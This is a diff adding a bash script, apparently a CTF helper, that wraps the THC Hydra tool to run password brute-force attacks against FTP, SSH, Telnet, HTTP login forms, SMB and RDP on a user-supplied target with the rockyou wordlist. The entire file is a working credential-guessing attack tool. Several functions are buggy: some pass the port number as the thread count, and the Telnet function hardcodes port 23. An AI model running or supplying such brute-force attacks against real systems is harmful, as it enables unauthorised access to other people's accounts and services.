@@ -1,0 +1,144 @@
+#!/bin/bash
+
+DEFAULT_WORDLIST=/usr/share/wordlists/rockyou.txt #change this for diffent wordlist
+SUPPORTS=( ftp ssh telnet get-http post-http smb rdp )
+FASTH="-I"
+
+function ftp {
+
+echo "FTP bruteforcer"
+read -p "IP: "  IP
+read -e -i 21 -p "Port (Standard 21: " PORT
+read -p "User: "  USERNAME
+read -e -i 21 -p "Tasks (exmaple normal ftp 16, fast ctf ftp 21): " TASK
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST
+read -e -i yes -p "Ignore restore old hyrdra session (yes/no): "  FAST
+
+if  [ "$FAST" = "yes" ];
+then
+	hydra -f $FASTH $IP -s $PORT ftp -l $USERNAME -P $WORDLIST -t $PORT -e ns -vV
+
+else
+	echo "Hydran aborted"
+fi
+}
+
+function ssh {
+
+echo "SSH bruteforcer"
+read -p "IP: " IP
+read -e -i 22 -p "Port (Standard 22): " PORT
+read -p "User: " USERNAME
+read -e -i 64 -p "Tasks (exmaple normal ssh 4, fast ctf ssh 64): " TASK
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST
+read -e -i yes -p "Ignore restore old hyrdra session (yes/no): "  FAST
+
+if [ "$FAST" = "yes"  ];
+then
+	hydra -f $FASTH -l $USERNAME -P $WORDLIST -t $TASK -vV -e ns $IP -s $PORT ssh
+else
+	echo "Hydran aborted"
+fi
+}
+
+function telnet {
+
+echo "Telnet bruteforcer"
+read -p "IP: " IP
+read -e -i 23 -p "Port (Standard 23): " PORT
+read -p "User: " USERNAME
+read -e -i 64 -p "Tasks (exmaple normal telnet 32, fast ctf telnet 64): " TASK
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST
+read -e -i yes -p "Ignore restore old hyrdra session  (yes/no): " FAST
+
+if [ "$FAST" = "yes" ];
+then
+	hydra $FASTH $IP -s $PORT telnet -l $USERNAME -P $WORDLIST -t 32 -s 23 -e ns -f -V
+else
+	echo "Hydran aborted"
+fi
+}
+
+function get-http {
+
+echo "GET-HTTP bruteforcer"
+read -p "IP/domain (example 10.10.10.13/hackab.se: " IP
+read -e -i 80 -p "Port (Standard 80): " PORT
+read -p "User: " USERNAME
+read -p "Dir (example /admin/login etc): " DIR
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST 
+read -e -i yes -p "Ignore restore old hyrdra session (yes/no): " FAST
+
+if [ "$FAST" = "yes" ];
+then
+	hydra -f $FASTH -l $USERNAME -P $WORDLIST -vV -t 4 -e ns $IP -s $PORT http-get $DIR
+else
+	echo "Hydran aborted"
+fi
+}
+
+function  post-http {
+
+echo "POST-HTTP bruteforcer"
+read -p "IP/domain (example 10.10.10.13/hackab.se): " IP
+read -e -i 80 -p "Port (Standard 80): " PORT
+read -p "User :" USERNAME
+read -p "Dir (example /admin/login etc): " DIR
+read -p "Part of error message at failed login (example 'invalid', 'failed' etc): " MSG
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST
+read -e -i yes -p "Ignore restore old hyrdra session (yes/no): " FAST
+
+if [ "$FAST" = "yes" ];
+then
+	hydra -f $FASTH -l $USERNAME -P $WORDLIST -t 4  $IP -s $PORT  http-form-post "$DIR:username=^USER^&password=^PASS^&Login=Login:$MSG" -V
+else
+	echo "Hydran aborted"
+fi
+}
+
+function smb {
+
+echo "SMB brueforcer"
+read -p "IP: " IP
+read -e -i 445 -p "Port (Standard 445): " PORT
+read -p "User: " USERNAME
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST 
+read -e -i yes -p "Ignore restore old hyrdra session  (yes/no): " FAST
+
+if [ "$FAST" = "yes"  ];
+then
+	 hydra -f $FASTH -l $USERNAME -P $WORDLIST $IP -s $PORT smb
+else
+	echo "Hydra aborted"
+fi
+}
+
+function rdp {
+
+echo "RDP bruteforcer"
+read -p "IP: " IP
+read -e -i 3389 -p "Port (Standard 3389: " PORT
+read -p "User: " USERNAME
+read -e -i 64 -p "Tasks (exmaple normal rdp 32, fast ctf rdp 64): " TASK
+read -e -i $DEFAULT_WORDLIST -p "Wordlist: " WORDLIST 
+read -e -i yes -p "Ignore restore old hyrdra session  (yes/no): " FAST
+
+if [ "$FAST" = "yes"  ];
+then
+	hydra -f $FASTH $IP -s $PORT rdp -l $USERNAME -P $WORDLIST -t $PORT -V
+else
+	echo "Hydran aborted"
+fi
+}
+
+
+
+echo "Welcome to Hydra syntax help!"
+echo "Default wordlist is: $DEFAULT_WORDLIST"
+echo "Syntax help for:"
+printf  '%s\n' "${SUPPORTS[@]}"
+read -p "Type what you want to bruteforce (example ssh): " CALL
+echo "###################################################################"
+$CALL
+
+
